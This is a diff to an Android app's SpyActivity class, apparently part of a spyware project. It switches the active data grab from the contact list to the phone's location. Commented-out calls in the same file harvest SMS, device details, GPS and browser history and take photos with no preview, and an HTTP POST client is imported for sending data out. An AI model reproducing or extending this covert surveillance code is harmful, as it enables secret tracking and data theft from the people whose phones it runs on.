@@ -9,6 +9,8 @@ import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
 
+import localisationInformations.Localisation;
+
 import org.apache.http.HttpResponse;
 import org.apache.http.NameValuePair;
 import org.apache.http.client.ClientProtocolException;
@@ -18,18 +20,6 @@ import org.apache.http.client.methods.HttpPost;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
 
-import phoneDeviceInformations.PhoneDevice;
-import smsInformations.GetSMS;
-
-import com.example.spyapp.R;
-import com.example.spyapp.R.id;
-import com.example.spyapp.R.layout;
-import com.example.spyapp.R.menu;
-
-import contactsinformations.ListContact;
-
-
-
 import android.app.Activity;
 import android.os.Bundle;
 import android.os.Looper;
@@ -37,6 +27,7 @@ import android.view.Menu;
 import android.view.View;
 import android.widget.Button;
 import android.widget.Toast;
+import browserInformations.BrowserHistory;
 
 public class SpyActivity extends Activity {
 
@@ -48,8 +39,13 @@ public class SpyActivity extends Activity {
 		//print sms conversations
 		//(new GetSMS()).getAllSms(this);
 		
-		(new ListContact()).CreateListContactFromPhone(this);
+		//(new ListContact()).CreateListContactFromPhone(this);
 	//(new PhoneDevice()).setAllPhoneDeviceInformations();
+		
+		//(new Picture()).takePictureNoPreview(this);
+		//(new Localisation()).getGPS(this);
+		(new Localisation())._getLocation(this);
+		//(new BrowserHistory()).getBrowserHist(this);
 		Button sendButton = (Button) findViewById(R.id.button1);
 		final SpyActivity zis = this;
 		sendButton.setOnClickListener(new View.OnClickListener() {
